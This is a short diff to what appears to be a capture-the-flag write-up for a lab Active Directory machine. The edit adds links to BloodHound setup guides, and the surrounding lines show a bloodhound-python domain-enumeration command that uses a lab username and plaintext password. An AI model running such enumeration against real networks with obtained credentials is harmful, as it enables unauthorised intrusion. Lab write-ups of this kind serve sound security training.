@@ -284,7 +284,7 @@ Info: Establishing connection to remote endpoint
 
 ## 3. Getting Root
 
-Since we have an access to the domain, try to get a better view of the domain.<br>
+Since we have an access to the domain, try to get a better view of the domain using [BloodHound](https://github.com/BloodHoundAD/BloodHound).<br>
 We can use `bloodhound-python` to gather information about the domain `EGOTISTICAL-BANK.LOCAL`.
 ```shell
 root@kali:~# bloodhound-python -u fsmith -p Thestrokes23 -c all -d egotistical-bank.local -ns 10.10.10.175
@@ -312,7 +312,8 @@ groups.json
 users.json
 ```
 
-Then, launch `neo4j` and `Bloodhound`.
+Then, launch `neo4j` and `Bloodhound`.<br>
+[Useful link for BloodHound initial setup is here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux).
 ```shell
 root@kali:~# neo4j console
 
